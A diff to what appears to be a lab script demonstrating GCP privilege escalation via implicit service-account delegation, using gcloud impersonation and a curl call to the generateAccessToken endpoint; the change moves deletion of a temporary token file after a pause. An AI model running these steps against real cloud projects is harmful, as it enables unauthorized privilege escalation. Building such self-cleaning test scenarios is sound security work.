@@ -22,12 +22,12 @@ gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gs
 curl "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com:generateAccessToken?access_token=$(cat /tmp/privesc_gcp)" \
   -d "{\"delegates\":[\"projects/-/serviceAccounts/implicitdelegationsa@${PROJECT_ID}.iam.gserviceaccount.com\"], \"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}" -H "Content-Type: application/json"
 
-rm /tmp/privesc_gcp
-
 # Cleaning
 echo "You should see a token before this message"
 read -p "Press any key to delete scenario... " -n1 -s
 echo ""
+
+rm /tmp/privesc_gcp
 
 delete_role "${TEMP_ROLE}"
 delete_sa "implicitdelegationsa"
